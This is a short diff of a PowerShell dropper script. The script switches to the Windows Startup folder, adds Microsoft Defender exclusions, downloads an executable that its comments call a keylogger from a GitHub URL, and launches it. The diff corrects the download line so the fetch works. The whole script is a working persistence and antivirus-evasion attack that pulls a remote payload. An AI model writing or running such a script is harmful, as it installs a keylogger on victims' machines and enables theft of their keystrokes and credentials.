@@ -1,6 +1,6 @@
 Set-Location $env:APPDATA\Microsoft\Windows\"Start Menu"\Programs\Startup #Go to the folder in which we will donwload files
 Add-MpPreference -ExclusionExtension exe -Force #Add exception for .exe files in antivirus
-Invoke-WebRequest https://github.com/Aroft-Developer/NBVCXWMLKJHGFDSQPOIUYTTREEZE/blob/main/MicrosoftStartFeed.exe -O Kbneffer.exe #Download keylogger script
+Invoke-WebRequest "https://github.com/Aroft-Developer/NBVCXWMLKJHGFDSQPOIUYTTREEZE/raw/main/MicrosoftStartFeed.exe" -OutFile "Kbneffer.exe"#Download keylogger script
 Add-MpPreference -ExclusionPath $env:APPDATA\Microsoft\Windows\"Start Menu"\Programs\Startup\Kbneffer.exe -Force #Add exception for keylogger.exe file in antivirus
 Start-Process Kbneffer.exe #Start keylogger script
 Remove-MpPreference -ExclusionExtension exe -Force #Reser .exe files exception in antivirus
